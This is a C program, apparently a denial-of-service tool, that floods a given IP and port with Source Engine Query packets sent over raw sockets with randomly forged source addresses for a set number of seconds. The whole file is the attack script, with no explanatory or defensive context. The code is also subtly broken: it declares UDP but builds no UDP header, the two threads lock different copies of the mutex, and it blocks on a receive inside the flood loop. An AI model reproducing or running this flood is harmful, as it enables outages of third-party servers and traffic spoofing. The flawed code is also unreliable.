#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netinet/ip.h>

#define MAX_LEN 1024

typedef struct {
    const char *ip;
    int port;
    struct timespec *duration;
    pthread_mutex_t mutex;
    int cancel_flag;
} ThreadArgs;

void send_query(const char *ip, int port, const char *payload, size_t payload_len) {
    int sockfd;
    struct sockaddr_in servaddr;
    char buffer[MAX_LEN];

    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    servaddr.sin_addr.s_addr = inet_addr(ip);

    struct iphdr ip_header;
    ip_header.version = 4;
    ip_header.ihl = 5;
    ip_header.tos = 0;
    ip_header.tot_len = sizeof(struct iphdr) + payload_len;
    ip_header.id = htons(54321);
    ip_header.frag_off = htons(0);
    ip_header.ttl = 255;
    ip_header.protocol = IPPROTO_UDP;
    ip_header.check = 0; 
    ip_header.saddr = htonl(rand() % ((255 << 24) | (255 << 16) | (255 << 8) | 0)); 
    ip_header.daddr = inet_addr(ip);

    memcpy(buffer, &ip_header, sizeof(ip_header));
    memcpy(buffer + sizeof(ip_header), payload, payload_len);

    if (sendto(sockfd, buffer, ip_header.tot_len, 0, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        perror("sendto failed");
        exit(EXIT_FAILURE);
    }

    socklen_t len = sizeof(servaddr);
    ssize_t recv_len = recvfrom(sockfd, buffer, MAX_LEN, 0, (struct sockaddr *)&servaddr, &len);
    if (recv_len < 0) {
        perror("recvfrom failed");
        exit(EXIT_FAILURE);
    }

    printf("response from %s:%d: ", ip, port);
    for (int i = 0; i < recv_len; ++i) {
        printf("%c", buffer[i]);
    }
    printf("\n");

    close(sockfd);
}

void *send_query_thread(void *args) {
    ThreadArgs *threadArgs = (ThreadArgs *)args;
    const char *ip = threadArgs->ip;
    int port = threadArgs->port;
    struct timespec *duration = threadArgs->duration;

    const char payload_hex[] = "ffffffff54536f7572636520456e67696e6520517565727900";
    size_t payload_len = strlen(payload_hex) / 2;

    unsigned char payload[MAX_LEN];
    for (size_t i = 0; i < payload_len; ++i) {
        sscanf(&payload_hex[i * 2], "%2hhx", &payload[i]);
    }

    while (1) {
        pthread_mutex_lock(&threadArgs->mutex);
        int flag = threadArgs->cancel_flag;
        pthread_mutex_unlock(&threadArgs->mutex);
        if (flag)
            break;

        send_query(ip, port, payload, payload_len);
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <sexs>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration_seconds = atoi(argv[3]);

    struct timespec duration;
    duration.tv_sec = duration_seconds;
    duration.tv_nsec = 0;

    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

    ThreadArgs threadArgs;
    threadArgs.ip = ip;
    threadArgs.port = port;
    threadArgs.duration = &duration;
    threadArgs.mutex = mutex;
    threadArgs.cancel_flag = 0;

    pthread_t thread;
    if (pthread_create(&thread, NULL, send_query_thread, (void *)&threadArgs) != 0) {
        perror("pthread_create failed");
        exit(EXIT_FAILURE);
    }

    sleep(duration_seconds);

    pthread_mutex_lock(&mutex);
    threadArgs.cancel_flag = 1;
    pthread_mutex_unlock(&mutex);

    pthread_join(thread, NULL);

    return 0;
}
